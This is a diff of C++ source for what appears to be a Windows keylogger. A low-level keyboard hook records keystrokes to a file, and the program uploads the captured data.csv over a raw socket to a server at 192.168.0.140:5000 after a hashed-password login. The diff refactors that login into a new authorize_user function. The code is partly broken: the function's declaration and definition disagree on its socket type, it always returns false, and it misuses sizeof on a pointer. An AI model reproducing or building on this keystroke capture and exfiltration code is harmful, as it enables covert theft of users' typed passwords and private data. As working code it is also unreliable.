@@ -5,28 +5,31 @@
 #include <WS2tcpip.h>
 #include <iphlpapi.h>
 #include <thread>
-#include <Windows.h>
+
+#define WIN32_NO_STATUS
+#include <windows.h>
+#undef WIN32_NO_STATUS
+
 #include <iostream>
 #include <fstream>
 #include <vector>
 
 #include <wincrypt.h>
 #include <ntstatus.h>
+#include <winnt.h>
 #include <winternl.h>
 #include <bcrypt.h>
-#include <sal.h>
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "ws2_32.lib") // WinSock for posting our file to server...
 
-
-#define CRISTALLO_PORT "23456"
 #define CRISTALLO_LEN 1024
 
 LRESULT WINAPI MyKeyboardHook(int code, WPARAM wParam, LPARAM lParam);
 void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp);
 static void initialize_hook_thread();
-static void begin_file_transfer(_In_ std::string userName, _Out_ std::string password);
-bool hash_password(_In_ std::string pass, _Out_ std::string* outPass)
+static void begin_file_transfer(std::string userName, std::string password);
+bool hash_password(std::string pass, std::string* outPass);
+bool authorize_user(SOCKET connectionSocket, std::string userName, std::string password);
 
 DWORD lastKey = 0x0;
 DWORD lastAction = 0x0;
@@ -260,7 +263,7 @@ void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp)
 }
 
 
-LRESULT WINAPI MyKeyboardHook(int code, WPARAM wParam, LPARAM lParam)
+LRESULT WINAPI MyKeyboardHook( int code,  WPARAM wParam,  LPARAM lParam)
 {
 	// Type cast WPARAM to tagKBDLLHOOKSTRUCT as it containers a pointer to this
 
@@ -318,9 +321,9 @@ LRESULT WINAPI MyKeyboardHook(int code, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(NULL, code, wParam, lParam); // We have to call the next hook in sequence.
 }
 
-bool hash_password(std::string password, std::string * outPassword)
-{
 
+bool hash_password(std::string password,  std::string * outPassword)
+{
 	NTSTATUS Status;
 	BCRYPT_ALG_HANDLE AlgHandle = NULL;
 	BCRYPT_HASH_HANDLE HashHandle = NULL;
@@ -333,7 +336,7 @@ bool hash_password(std::string password, std::string * outPassword)
 	if (outPassword == nullptr)
 	{
 		printf("OutPassword == nullptr\n");
-		return false;
+		outPassword = new std::string();
 	}
 
 	Status = BCryptOpenAlgorithmProvider(&AlgHandle, BCRYPT_SHA256_ALGORITHM,
@@ -394,11 +397,97 @@ bool hash_password(std::string password, std::string * outPassword)
 	return true;
 }
 
+bool authorize_user(SOCKET *connectionSocket, std::string userName, std::string password)
+{
+	if (connectionSocket == nullptr || *connectionSocket == INVALID_SOCKET)
+	{
+		printf("Cannot authorize user... Connection socket is bad.\n");
+		return false;
+	}
+	const char* httpHeader;
+
+	httpHeader = {
+		"POST /user/login HTTP/1.1\r\n"
+		"Host: 192.168.0.140:5000\r\n"
+		"User-Agent: Mozilla Firefox/4.0\r\n"
+		"Content-Length: %d\r\n"
+		"Content-Type: application/x-www-form-urlencoded\r\n"
+		"Accept-Charset: utf-8\r\n\r\n"
+	};
+
+	const char* postHeader;
+	postHeader = { "username=%s&password=%s\r\n\r\n" };
+
+	//
+
+
+	char sHeader[sizeof(httpHeader) + 100];
+	char* sData = new char[256];
+	char sRecv[256];
+
+	ZeroMemory(sHeader, sizeof(sHeader));
+	ZeroMemory(sData, sizeof(sData));
+	ZeroMemory(sRecv, sizeof(sRecv));
+
+	std::string postData;
+	postData = "username=" + userName;
+	postData += "&passHash=" + password;
+	int dataSize = postData.size();
+
+	std::string header;
+	header = "POST /user/create HTTP/1.1\r\n";
+	header += "Host: 192.168.0.140:5000\r\n";
+	header += "Content-Type: application/x-www-form-urlencoded\r\n";
+	header += "Content-Length: " + std::to_string(dataSize) + "\r\n";
+	header += "Accept-Charset: utf-8\r\n";
+	header += "\r\n";
+	header += postData + "\r\n";
+	header += "\r\n";
+
+
+	//printf("[DataLen]: %i\n[Header Len]: %i\n", dataSize, header.size());
+	//printf("[HEADER]:\n%s\n", header.c_str());
+	//printf("[POSTDATA]: %s\n", postData.c_str());
+	if (header.size() > 0)
+	{
+		if (send(*connectionSocket, header.c_str(), header.size(), 0) != SOCKET_ERROR)
+		{
+			if (recv(*connectionSocket, sRecv, sizeof(sRecv), 0) != SOCKET_ERROR)
+			{
+				MessageBoxA(NULL, sRecv, 0, 0);
+				printf("%s\n", sRecv);
+				
+			}
+			else
+			{
+				printf("Failure to receive information from the server...\n");
+				delete[] sData;
+				return false;
+			}
+		}
+		else
+		{
+			printf("Failure to send information to the server...\n");
+			delete[] sData;
+			return false;
+		}
+	}
+	else
+	{
+		printf("Something went wrong with assigning the header?\n");
+		delete[] sData;
+		return false;
+	}
+
+	return false;
+}
+
+
 static void begin_file_transfer(std::string userName, std::string password)
 {
 
 	std::string outPass;
-	if(!hash_password(password, &outPass));
+	if(!hash_password(password, &outPass))
 	{
 		printf("Something went wrong in hashing password...\n");
 		return;
@@ -451,6 +540,15 @@ static void begin_file_transfer(std::string userName, std::string password)
 		return;
 	}
 
+	if (!(authorize_user(ConnectionSocket, userName, outPass)))
+	{
+		printf("Bad authentication details...\n");
+		closesocket(ConnectionSocket);
+		ConnectionSocket = INVALID_SOCKET;
+		WSACleanup();
+		return;
+	}
+
 	/*FILE *sendFile = NULL;
 	fopen_s(&sendFile, "data.csv", "r");
 	if (sendFile == NULL)
@@ -462,65 +560,7 @@ static void begin_file_transfer(std::string userName, std::string password)
 
 	// LOGIN HERE
 
-	const char* httpHeader;
-
-	httpHeader = {
-		"POST /user/login HTTP/1.1\r\n"
-		"Host: 192.168.0.140:5000\r\n"
-		"User-Agent: Mozilla Firefox/4.0\r\n"
-		"Content-Length: %d\r\n"
-		"Content-Type: application/x-www-form-urlencoded\r\n"
-		"Accept-Charset: utf-8\r\n\r\n"
-	};
-
-	const char* postHeader;
-	postHeader = { "username=%s&password=%s\r\n\r\n" };
-
-	//
-
-
-	char sHeader[sizeof(httpHeader) + 100];
-	char* sData = new char[256];
-	char sRecv[256];
-
-	ZeroMemory(sHeader, sizeof(sHeader));
-	ZeroMemory(sData, sizeof(sData));
-	ZeroMemory(sRecv, sizeof(sRecv));
-
-	std::string postData;
-	postData = "username=" + userName;
-	postData += "&passHash=" + outPass;
-	int dataSize = postData.size();
-
-	std::string header;
-	header = "POST /user/create HTTP/1.1\r\n";
-	header += "Host: 192.168.0.140:5000\r\n";
-	header += "Content-Type: application/x-www-form-urlencoded\r\n";
-	header += "Content-Length: " + std::to_string(dataSize) + "\r\n";
-	header += "Accept-Charset: utf-8\r\n";
-	header += "\r\n";
-	header += postData + "\r\n";
-	header += "\r\n";
-
-
-	//printf("[DataLen]: %i\n[Header Len]: %i\n", dataSize, header.size());
-	//printf("[HEADER]:\n%s\n", header.c_str());
-	//printf("[POSTDATA]: %s\n", postData.c_str());
-	if (header.size() > 0)
-	{
-		if (send(ConnectionSocket, header.c_str(), header.size(), 0) != SOCKET_ERROR)
-		{
-			//if (send(ConnectionSocket, sData, DataLength, 0) != SOCKET_ERROR)
-			//{
-			if (recv(ConnectionSocket, sRecv, sizeof(sRecv), 0) != SOCKET_ERROR)
-			{
-				//MessageBoxA(NULL, sRecv, 0, 0);
-				printf("%s\n", sRecv);
-			}
-			//}
-		}
-	}
-	return;
+	
 
 	std::ifstream sendFile("data.csv", std::ifstream::in);
 	printf("0x%08x\n", (DWORD&)sendFile);
@@ -557,9 +597,6 @@ static void begin_file_transfer(std::string userName, std::string password)
 		WSACleanup();
 	}
 
-	//delete[] sData;
-	//delete[] sHeader;
-	//delete[] sRecv;
 	sendFile.close();
 	closesocket(ConnectionSocket);
 	WSACleanup();
